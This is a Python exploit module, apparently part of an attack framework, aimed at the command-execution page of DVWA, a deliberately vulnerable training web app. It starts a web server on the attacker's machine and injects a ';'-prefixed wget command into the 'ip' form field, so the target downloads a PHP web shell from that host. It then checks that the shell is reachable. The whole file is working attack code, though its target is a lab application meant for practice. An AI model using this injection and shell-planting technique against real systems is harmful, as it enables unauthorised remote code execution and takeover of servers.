
import requests
import random
import time
from core.network import *
from core.common import *
from urllib.parse import urljoin,urlparse,urlencode

def exploit(url,cookies = {}):
    print("Try Dvwa Rce exploit :")
    
    # Start the http server for get up.php from attacker machine
    host = urlparse(url).hostname
    ip = ip_on_same_network(host) if ip_on_same_network(host) else get_public_ip()
    port = 8000
    
    server = WebServer(host,port)
    server.run()

    shell_name = str(random.randint(11111,99999))
    headers = makeHeaders(host)

    payload = {
        "ip" : f";{wget_payload(lhost=ip,lport=port,shell_name=shell_name)}" ,
        "submit" : "submit"
    }

    vulnerable_path = "vulnerabilities/exec/"
    full_url = urljoin(url,vulnerable_path)
    time.sleep(10) 

    # send exploit
    
    requests.post(full_url,cookies=cookies,headers=headers,data=payload)
    server.stop()
    
    shell_path = urljoin(full_url,shell_name + '.php')
    check_exploit_succeed(shell_path,headers,'\t')

    print()